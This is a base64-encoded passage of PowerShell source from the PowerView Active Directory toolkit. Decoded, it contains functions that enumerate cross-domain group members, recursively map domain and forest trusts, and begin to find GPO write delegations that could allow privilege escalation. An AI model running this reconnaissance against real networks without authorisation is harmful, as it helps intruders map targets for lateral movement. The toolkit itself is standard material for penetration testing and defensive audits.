LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG1lbWJlcj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgc3RhbmRhcmQgZ3JvdXAgbmFtZXMgdG8gaWdub3JlCiAgICAgICAgJEV4Y2x1ZGVHcm91cHMgPSBAKCdVc2VycycsICdEb21haW4gVXNlcnMnLCAnR3Vlc3RzJykKCiAgICAgICAgR2V0LURvbWFpbkdyb3VwIEBTZWFyY2hlckFyZ3VtZW50cyB8IFdoZXJlLU9iamVjdCB7ICRFeGNsdWRlR3JvdXBzIC1ub3Rjb250YWlucyAkXy5zYW1hY2NvdW50bmFtZSB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkR3JvdXBOYW1lID0gJF8uc2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgJEdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgPSAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAkR3JvdXBEb21haW4gPSAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZS5TdWJTdHJpbmcoJEdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKCiAgICAgICAgICAgICRfLm1lbWJlciB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgZmlsdGVyIGZvciBmb3JlaWduIFNJRHMgaW4gdGhlIGNuIGZpZWxkIGZvciB1c2VycyBpbiBhbm90aGVyIGRvbWFpbiwKICAgICAgICAgICAgICAgICMgICBvciBpZiB0aGUgRE4gZG9lc24ndCBlbmQgd2l0aCB0aGUgcHJvcGVyIEROIGZvciB0aGUgcXVlcmllZCBkb21haW4KICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkXy5TdWJTdHJpbmcoJF8uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgIGlmICgoJF8gLW1hdGNoICdDTj1TLTEtNS0yMS4qLS4qJykgLW9yICgkR3JvdXBEb21haW4gLW5lICRNZW1iZXJEb21haW4pKSB7CiAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRpc3Rpbmd1aXNoZWROYW1lID0gJF8KICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9ICRfLlNwbGl0KCcsJylbMF0uc3BsaXQoJz0nKVsxXQoKICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEb21haW4nICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnICRNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVpZ25Hcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpblRydXN0TWFwcGluZyB7CjwjCi5TWU5PUFNJUwoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIGFsbCB0cnVzdHMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbiBhbmQgdGhlbiBlbnVtZXJhdGVzCmFsbCB0cnVzdHMgZm9yIGVhY2ggZG9tYWluIGl0IGZpbmRzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluLCBHZXQtRG9tYWluVHJ1c3QsIEdldC1Gb3Jlc3RUcnVzdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBlbnVtZXJhdGUgZG9tYWluIHRydXN0IHJlbGF0aW9uc2hpcHMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbiB1c2luZwphIG51bWJlciBvZiBtZXRob2RzLCBhbmQgdGhlbiBlbnVtZXJhdGVzIGFsbCB0cnVzdHMgZm9yIGVhY2ggZm91bmQgZG9tYWluLCByZWN1cnNpdmVseQptYXBwaW5nIGFsbCByZWFjaGFibGUgdHJ1c3QgcmVsYXRpb25zaGlwcy4gQnkgZGVmYXVsdCwgYW5kIExEQVAgc2VhcmNoIHVzaW5nIHRoZSBmaWx0ZXIKJyhvYmplY3RDbGFzcz10cnVzdGVkRG9tYWluKScgaXMgdXNlZC0gaWYgYW55IExEQVAtYXBwcm9wcmlhdGUgcGFyYW1ldGVycyBhcmUgc3BlY2lmaWVkCkxEQVAgaXMgdXNlZCBhcyB3ZWxsLiBJZiB0aGUgLU5FVCBmbGFnIGlzIHNwZWNpZmllZCwgdGhlIC5ORVQgbWV0aG9kCkdldEFsbFRydXN0UmVsYXRpb25zaGlwcygpIGlzIHVzZWQgb24gdGhlIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluCm9iamVjdC4gSWYgdGhlIC1BUEkgZmxhZyBpcyBzcGVjaWZpZWQsIHRoZSBXaW4zMiBBUEkgRHNFbnVtZXJhdGVEb21haW5UcnVzdHMoKSBjYWxsIGlzCnVzZWQgdG8gZW51bWVyYXRlIGluc3RlYWQuIElmIGFueSAKCi5QQVJBTUVURVIgQVBJCgpTd2l0Y2guIFVzZSBhbiBBUEkgY2FsbCAoRHNFbnVtZXJhdGVEb21haW5UcnVzdHMpIHRvIGVudW1lcmF0ZSB0aGUgdHJ1c3RzIGluc3RlYWQgb2YgdGhlCmJ1aWx0LWluIExEQVAgbWV0aG9kLgoKLlBBUkFNRVRFUiBORVQKClN3aXRjaC4gVXNlIC5ORVQgcXVlcmllcyB0byBlbnVtZXJhdGUgdHJ1c3RzIGluc3RlYWQgb2YgdGhlIGRlZmF1bHQgTERBUCBtZXRob2QuCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0TWFwcGluZyB8IEV4cG9ydC1DU1YgLU5vVHlwZUluZm9ybWF0aW9uIHRydXN0cy5jc3YKCk1hcCBhbGwgcmVhY2hhYmxlIGRvbWFpbiB0cnVzdHMgdXNpbmcgLk5FVCBtZXRob2RzIGFuZCBvdXRwdXQgZXZlcnl0aGluZyB0byBhIC5jc3YgZmlsZS4KCi5FWEFNUExFCgpHZXQtRG9tYWluVHJ1c3RNYXBwaW5nIC1BUEkgfCBFeHBvcnQtQ1NWIC1Ob1R5cGVJbmZvcm1hdGlvbiB0cnVzdHMuY3N2CgpNYXAgYWxsIHJlYWNoYWJsZSBkb21haW4gdHJ1c3RzIHVzaW5nIFdpbjMyIEFQSSBjYWxscyBhbmQgb3V0cHV0IGV2ZXJ5dGhpbmcgdG8gYSAuY3N2IGZpbGUuCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0TWFwcGluZyAtTkVUIHwgRXhwb3J0LUNTViAtTm9UeXBlSW5mb3JtYXRpb24gdHJ1c3RzLmNzdgoKTWFwIGFsbCByZWFjaGFibGUgZG9tYWluIHRydXN0cyB1c2luZyAuTkVUIG1ldGhvZHMgYW5kIG91dHB1dCBldmVyeXRoaW5nIHRvIGEgLmNzdiBmaWxlLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5UcnVzdE1hcHBpbmcgLVNlcnZlciAnUFJJTUFSWS50ZXN0bGFiLmxvY2FsJyB8IEV4cG9ydC1DU1YgLU5vVHlwZUluZm9ybWF0aW9uIHRydXN0cy5jc3YKCk1hcCBhbGwgcmVhY2hhYmxlIGRvbWFpbiB0cnVzdHMgdXNpbmcgTERBUCwgYmluZGluZyB0byB0aGUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIHNlcnZlciBmb3IgcXVlcmllcwp1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscywgYW5kIG91dHB1dCBldmVyeXRoaW5nIHRvIGEgLmNzdiBmaWxlLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Eb21haW5UcnVzdC5MREFQCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGRvbWFpbiBMREFQIHRydXN0IHJlc3VsdCBmaWVsZHMgKGRlZmF1bHQpLgoKUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVAoKQSBUcnVzdFJlbGF0aW9uc2hpcEluZm9ybWF0aW9uQ29sbGVjdGlvbiByZXR1cm5lZCB3aGVuIHVzaW5nIC5ORVQgbWV0aG9kcy4KClBvd2VyVmlldy5Eb21haW5UcnVzdC5BUEkKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZG9tYWluIEFQSSB0cnVzdCByZXN1bHQgZmllbGRzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5MREFQJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSScpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFQSSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ05FVCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5FVCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgICMga2VlcCB0cmFjayBvZiBkb21haW5zIHNlZW4gc28gd2UgZG9uJ3QgaGl0IGluZmluaXRlIHJlY3Vyc2lvbgogICAgJFNlZW5Eb21haW5zID0gQHt9CgogICAgIyBvdXIgZG9tYWluIHN0YXR1cyB0cmFja2VyCiAgICAkRG9tYWlucyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlN0YWNrCgogICAgJERvbWFpblRydXN0QXJndW1lbnRzID0gQHt9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBUEknXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0FQSSddID0gJEFQSSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydORVQnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ05FVCddID0gJE5FVCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgIyBnZXQgdGhlIGN1cnJlbnQgZG9tYWluIGFuZCBwdXNoIGl0IG9udG8gdGhlIHN0YWNrCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAkQ3VycmVudERvbWFpbiA9IChHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsKS5OYW1lCiAgICB9CiAgICBlbHNlIHsKICAgICAgICAkQ3VycmVudERvbWFpbiA9IChHZXQtRG9tYWluKS5OYW1lCiAgICB9CiAgICAkRG9tYWlucy5QdXNoKCRDdXJyZW50RG9tYWluKQoKICAgIHdoaWxlKCREb21haW5zLkNvdW50IC1uZSAwKSB7CgogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQoKICAgICAgICAjIGlmIHdlIGhhdmVuJ3Qgc2VlbiB0aGlzIGRvbWFpbiBiZWZvcmUKICAgICAgICBpZiAoJERvbWFpbiAtYW5kICgkRG9tYWluLlRyaW0oKSAtbmUgJycpIC1hbmQgKC1ub3QgJFNlZW5Eb21haW5zLkNvbnRhaW5zS2V5KCREb21haW4pKSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVudW1lcmF0aW5nIHRydXN0cyBmb3IgZG9tYWluOiAnJERvbWFpbiciCgogICAgICAgICAgICAjIG1hcmsgaXQgYXMgc2VlbiBpbiBvdXIgbGlzdAogICAgICAgICAgICAkTnVsbCA9ICRTZWVuRG9tYWlucy5BZGQoJERvbWFpbiwgJycpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgIyBnZXQgYWxsIHRoZSB0cnVzdHMgZm9yIHRoaXMgZG9tYWluCiAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAgICAgJFRydXN0cyA9IEdldC1Eb21haW5UcnVzdCBARG9tYWluVHJ1c3RBcmd1bWVudHMKCiAgICAgICAgICAgICAgICBpZiAoJFRydXN0cyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzID0gQCgkVHJ1c3RzKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgZ2V0IGFueSBmb3Jlc3QgdHJ1c3RzLCBpZiB0aGV5IGV4aXN0CiAgICAgICAgICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdORVQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdFRydXN0QXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEZvcmVzdFRydXN0QXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRm9yZXN0VHJ1c3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzICs9IEdldC1Gb3Jlc3RUcnVzdCBARm9yZXN0VHJ1c3RBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJFRydXN0cykgewogICAgICAgICAgICAgICAgICAgIGlmICgkVHJ1c3RzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgewogICAgICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzID0gQCgkVHJ1c3RzKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIyBlbnVtZXJhdGUgZWFjaCB0cnVzdCBmb3VuZAogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUcnVzdCBpbiAkVHJ1c3RzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkVHJ1c3QuU291cmNlTmFtZSAtYW5kICRUcnVzdC5UYXJnZXROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIG1ha2Ugc3VyZSB3ZSBwcm9jZXNzIHRoZSB0YXJnZXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJERvbWFpbnMuUHVzaCgkVHJ1c3QuVGFyZ2V0TmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RNYXBwaW5nXSBFcnJvcjogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtR1BPRGVsZWdhdGlvbiB7CjwjCi5TWU5PUFNJUwoKRmluZHMgdXNlcnMgd2l0aCB3cml0ZSBwZXJtaXNzaW9ucyBvbiBHUE8gb2JqZWN0cyB3aGljaCBtYXkgYWxsb3cgcHJpdmlsZWdlIGVzY2FsYXRpb24gd2l0aGluIHRoZSBkb21haW4uCgpBdXRob3I6IEl0YW1hciBNaXpyYWhpIChATXJBbmRlN3NvbikgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLlBBUkFNRVRFUiBHUE9OYW1lCgpUaGUgR1BPIGRpc3BsYXkgbmFtZSB0byBxdWVyeSBmb3IsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouRVhBTVBMRQoKR2V0LUdQT0RlbGVnYXRpb24KClJldHVybnMgYWxsIEdQTyBkZWxlZ2F0aW9ucyBpbiBjdXJyZW50IGZvcmVz